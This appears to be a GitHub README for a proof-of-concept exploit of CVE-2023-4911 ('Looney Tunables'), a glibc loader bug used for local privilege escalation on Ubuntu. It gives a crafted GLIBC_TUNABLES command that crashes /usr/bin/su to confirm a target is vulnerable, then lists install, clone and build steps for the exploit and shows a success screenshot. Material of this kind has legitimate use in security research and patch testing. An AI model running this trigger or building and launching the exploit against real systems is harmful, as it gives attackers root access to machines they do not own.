# PoC & Exploit of CVE-2023-4911 "Looney Tunables"

[![TiiZss - CVE-2023-4911](https://img.shields.io/static/v1?label=TiiZss&message=CVE-2023-4911&color=blue&logo=github)](https://github.com/TiiZss/CVE-2023-4911 "Go to GitHub repo")
[![stars - CVE-2023-4911](https://img.shields.io/github/stars/TiiZss/CVE-2023-4911?style=social)](https://github.com/TiiZss/CVE-2023-4911)
[![forks - CVE-2023-4911](https://img.shields.io/github/forks/TiiZss/CVE-2023-4911?style=social)](https://github.com/TiiZss/CVE-2023-4911)
[![issues - CVE-2023-4911](https://img.shields.io/github/issues/TiiZss/CVE-2023-4911)](https://github.com/TiiZss/CVE-2023-4911/issues)


[![OS - Linux](https://img.shields.io/badge/OS-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/ "Go to Linux homepage")
[![GLIBC - >=2.34](https://img.shields.io/badge/GLIBC->=2.34-2ea44f)]("http://ftp.gnu.org/gnu/libc/")
[![Made with - C](https://img.shields.io/badge/Made_with-C-2ea44f)]("https://en.wikipedia.org/wiki/C_(programming_language)")
[![Made with Python](https://img.shields.io/badge/Python->=3-blue?logo=python&logoColor=white)](https://python.org "Go to Python homepage")
[![dependency - pwntools](https://img.shields.io/badge/dependency-pwntools-blue)](https://pypi.org/project/pwntools)


This is a PoC of CVE-2023-4911 (a.k.a. "Looney Tunables") exploiting a bug in glibc dynamic loader's `GLIBC_TUNABLES` environment variable parsing function `parse_tunables()`.

Code has been tested on Ubuntu 22.04.1 and 22.04.3 with glibc version `2.35-0ubuntu3.1`, `2.35-0ubuntu3.3` . 
No attempts have been made to generalize the PoC (read: "Works On My Machines"), so your mileage may vary.

As always, big kudos to the [Qualys Threat Research Unit](https://www.qualys.com/tru/) for the discovery of the vulnerability and for the [very detailed writeup](https://seclists.org/oss-sec/2023/q4/18).

## PoC

First you test if the system you want to exploit is vulnerable, for that you run:
```
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=\`printf '%08192x' 1`" /usr/bin/su --help
```
If you obtain as result: 
```
Segmentation fault (core dumped)
```
The target is vulnerable

## Prerequisites

You'll need:
- Python 3
- Pip
- [Pwn tools](https://docs.pwntools.com/en/stable/install.html)
- gcc

```
apt update
apt install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

## Installation and Exploit

```
git clone https://github.com/TiiZss/CVE-2023-4911
cd CVE-2023-4911
make
```
## Result

![Success](https://github.com/TiiZss/CVE-2023-4911/blob/main/img/CVE-2023-4911-Linux%20Lite.png "CVE-2023-4911 Success")
-----

Exploit written by [Xion](https://twitter.com/0x10n) of [KAIST Hacking Lab](https://kaist-hacking.github.io/)

Modifications written by [tisasia](https://twitter.com/tisasia) member of [TiiZss hacking Lab](https://www.tiizss.com)
